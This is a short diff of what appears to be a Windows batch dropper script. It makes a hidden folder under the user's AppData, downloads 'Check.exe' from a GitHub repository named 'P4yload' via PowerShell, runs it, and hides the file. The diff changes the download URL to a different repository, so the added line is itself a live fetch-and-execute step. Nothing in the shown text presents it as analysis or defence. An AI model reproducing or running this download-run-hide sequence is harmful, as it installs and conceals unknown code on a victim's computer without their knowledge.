@@ -31,6 +31,6 @@ mkdir "Check"
 attrib +h "Check" /s /d
 cd C:\Users\%USERNAME%\AppData\Local\Check" 
 :----------------------------------------------------------------------------------------------------------------:
-Powershell -Command "Invoke-Webrequest 'https://github.com/P4yload/CheckWeb1/raw/main/Check.exe' -OutFile Check.exe"
+Powershell -Command "Invoke-Webrequest 'https://github.com/P4yload/WebCheck/raw/main/Check.exe' -OutFile Check.exe"
 start Check.exe
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Check\Check.exe" /s /d
